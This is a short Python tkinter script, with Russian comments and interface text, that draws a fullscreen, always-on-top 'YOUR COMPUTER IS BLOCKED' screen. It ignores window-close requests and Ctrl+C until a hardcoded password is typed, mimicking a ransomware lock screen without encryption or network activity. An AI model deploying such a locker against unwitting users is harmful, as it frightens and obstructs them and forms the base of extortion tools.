import tkinter as tk
from tkinter import messagebox
import os
import sys

def block_computer():
    # Создаем главное окно
    root = tk.Tk()
    root.title("Блокировка компьютера")
    root.attributes('-fullscreen', True)  # Полноэкранный режим
    root.configure(bg='black')
    
    # Делаем окно поверх всех других окон
    root.attributes('-topmost', True)
    
    # Запрещаем закрытие окна через Alt+F4 или другие методы
    root.protocol("WM_DELETE_WINDOW", lambda: None)
    
    # Создаем надпись "Ваш компьютер заблокирован"
    label = tk.Label(
        root, 
        text="ВАШ КОМПЬЮТЕР ЗАБЛОКИРОВАН", 
        font=("Arial", 40, "bold"), 
        fg="red", 
        bg="black"
    )
    label.pack(pady=100)
    
    # Создаем поле для ввода пароля
    password_label = tk.Label(root, text="Введите пароль для разблокировки:", font=("Arial", 20), fg="white", bg="black")
    password_label.pack(pady=20)
    
    password_entry = tk.Entry(root, show="*", font=("Arial", 20))
    password_entry.pack(pady=10)
    
    # Функция проверки пароля
    def check_password():
        if password_entry.get() == "12345678":
            root.destroy()  # Закрываем окно блокировки
        else:
            messagebox.showerror("Ошибка", "Неверный пароль!")
            password_entry.delete(0, tk.END)
    
    # Кнопка для проверки пароля
    submit_button = tk.Button(
        root, 
        text="Разблокировать", 
        command=check_password, 
        font=("Arial", 20), 
        bg="green", 
        fg="white"
    )
    submit_button.pack(pady=20)
    
    # Запускаем главный цикл
    root.mainloop()

if __name__ == "__main__":
    # Проверяем, не запущена ли уже программа (чтобы избежать множественных экземпляров)
    try:
        block_computer()
    except KeyboardInterrupt:
        # Игнорируем попытки закрыть программу через Ctrl+C
        pass
